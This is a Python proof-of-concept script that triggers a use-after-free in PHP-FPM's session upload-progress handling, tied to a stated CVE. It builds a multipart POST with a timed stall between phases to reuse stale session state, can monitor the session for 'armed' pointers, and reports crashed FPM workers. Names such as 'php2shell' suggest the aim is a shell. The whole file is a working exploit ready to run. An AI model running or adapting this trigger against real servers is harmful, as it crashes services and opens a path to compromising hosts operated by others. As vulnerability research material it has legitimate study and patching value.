#!/usr/bin/env python3
"""
FPM trigger for CVE-2026-109619 (session.upload_progress lifecycle).

Sends a multipart POST whose file data is split by a stall longer than
session.upload_progress.min_freq (default 1s). The second FILE_DATA event
re-runs the session update path, which is where the stale state is consumed.

Usage:
    python3 poc/fpm_trigger.py --port 8090
    python3 poc/fpm_trigger.py --port 8091 --runs 3
"""
import argparse
import json
import socket
import time
import uuid

FILLUNIT = 5120


def build(sid):
    b = b"php2shell-trigger"
    parts = b""
    parts += b"--" + b + b"\r\n"
    parts += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
    parts += sid.encode() + b"\r\n"
    parts += b"--" + b + b"\r\n"
    parts += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    parts += b"x\r\n"
    parts += b"--" + b + b"\r\n"
    parts += b'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'

    phase1 = parts + b"A" * (FILLUNIT + 64)
    phase2 = b"B" * (FILLUNIT + 64) + b"C" * (FILLUNIT + 64)
    phase2 += b"\r\n--" + b + b"--\r\n"
    return phase1, phase2, b


def connect(host, port):
    s = socket.create_connection((host, port), timeout=30)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return s


def read(s, timeout=10):
    s.settimeout(timeout)
    out = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        out += d
    s.close()
    return out


def check_session(host, port, sid):
    req = (f"GET /check_progress.php?sid={sid} HTTP/1.1\r\n"
           f"Host: {host}\r\nConnection: close\r\n\r\n").encode()
    s = connect(host, port)
    s.sendall(req)
    resp = read(s, timeout=5)
    body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else resp
    return body


def main():
    ap = argparse.ArgumentParser(description="FPM session.upload_progress trigger")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--path", default="/progress.php")
    ap.add_argument("--stall", type=float, default=1.5)
    ap.add_argument("--runs", type=int, default=1)
    ap.add_argument("--monitor", action="store_true")
    a = ap.parse_args()

    for run in range(1, a.runs + 1):
        sid = "php2shell" + uuid.uuid4().hex[:20]
        print(f"--- run {run}/{a.runs} sid={sid}")
        phase1, phase2, boundary = build(sid)
        body_len = len(phase1) + len(phase2)
        head = (
            f"POST {a.path} HTTP/1.1\r\n"
            f"Host: {a.host}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {body_len}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        s = connect(a.host, a.port)
        s.sendall(head + phase1)
        print(f"  [>] phase 1: {len(phase1)} bytes")

        if a.monitor:
            time.sleep(0.5)
            raw = check_session(a.host, a.port, sid)
            try:
                sess = json.loads(raw)
                p = sess.get("upload_progress_x")
                if p:
                    print(f"      upload_progress FOUND: bytes_processed={p.get('bytes_processed')} "
                          f"done={p.get('done')}")
                    print("      --> cached zval* pointers ARMED")
                elif not sess:
                    print("      session empty (upload_progress not activated)")
                else:
                    print(f"      session: {json.dumps(sess)[:160]}")
            except Exception:
                print(f"      raw: {raw[:160]}")
            time.sleep(max(0, a.stall - 0.5))
        else:
            time.sleep(a.stall)

        try:
            s.sendall(phase2)
            print(f"  [>] phase 2: {len(phase2)} bytes")
        except OSError as e:
            print(f"  [!] send failed: {e}")
        resp = read(s)
        if not resp:
            print("  [!] NO RESPONSE - FPM worker likely crashed")
        else:
            print("  [<] " + resp.split(b"\r\n", 1)[0].decode("latin1", "replace"))
            if b"502" in resp[:30] or b"503" in resp[:30]:
                print("  [!] FPM worker CRASHED - UAF likely triggered")


if __name__ == "__main__":
    main()
